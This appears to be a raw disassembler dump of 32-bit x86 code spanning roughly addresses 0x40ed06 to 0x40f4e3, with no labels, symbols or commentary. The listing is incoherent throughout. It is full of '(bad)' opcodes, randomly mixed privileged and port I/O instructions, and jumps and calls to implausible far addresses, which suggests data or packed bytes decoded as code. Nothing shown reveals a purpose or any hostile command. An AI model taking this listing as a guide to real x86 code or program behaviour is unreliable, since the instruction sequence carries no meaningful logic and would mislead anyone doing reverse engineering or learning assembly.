  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
